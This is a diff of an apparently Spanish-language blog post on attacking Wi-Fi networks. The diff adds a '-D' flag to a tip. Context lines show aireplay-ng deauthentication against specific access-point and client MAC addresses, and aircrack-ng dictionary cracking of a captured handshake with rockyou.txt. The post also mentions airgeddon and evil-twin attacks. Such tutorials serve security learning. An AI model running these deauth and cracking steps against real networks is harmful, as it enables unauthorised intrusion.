@@ -33,7 +33,7 @@ sudo su export AIRGEDDON_WINDOWS_HANDLING=tmux airgeddon Más info acá: https:/
 sudo wifite sudo airgeddon Podés capturar el handshare y intentar romperlo usando diccionarios, fuerza bruta con airgeddon, creando gemelo malvado. Podes crear diccionarios específicos así:">
   <meta itemprop="datePublished" content="2024-07-21T19:48:09-03:00">
   <meta itemprop="dateModified" content="2024-07-21T19:48:09-03:00">
-  <meta itemprop="wordCount" content="4029">
+  <meta itemprop="wordCount" content="4032">
   <meta itemprop="keywords" content="Atacando,Redes,Ciberseguridad,Vulnerabilidades">
   
   <meta name="twitter:card" content="summary">
@@ -436,7 +436,7 @@ Una serie de 4 paquetes intercambiados entre el cliente y el punto de acceso dur
 <p>Cuando el handshake es capturado se guardará en el directorio en donde estás situado.</p>
 <h3 id="deautenticamos-a-los-clientes-para-que-se-vuelvan-a-conectar-y-así-capturar-el-handshake-simultáneamente">Deautenticamos a los clientes para que se vuelvan a conectar y así capturar el handshake. (Simultáneamente)</h3>
 <p><code>aireplay-ng --deauth 0 -a 1C:5F:2B:E7:77:EA -c 40:E2:30:CC:1E:8D wlan1mon # donde -a es el SSID y -c es el cliente.</code></p>
-<p>O podés hacerlo sin el cliente <code>sin la opción -c</code></p>
+<p>O podés hacerlo sin el cliente <code>sin la opción -c</code> pero agregando <code>-D</code></p>
 <h3 id="una-vez-que-capturamos-el-handshake-intentamos-descubrir-la-contraseña-usando-un-diccionario">Una vez que capturamos el handshake, intentamos descubrir la contraseña usando un diccionario.</h3>
 <p><code>aircrack-ng handshake.cap -w passwords.txt</code></p>
 <p>En KaliLinux hay un diccionario muy conocido que se llama rockyou.txt y otros diccionarios que se pueden ver ejecutando el comando <code>wordlists</code>.</p>
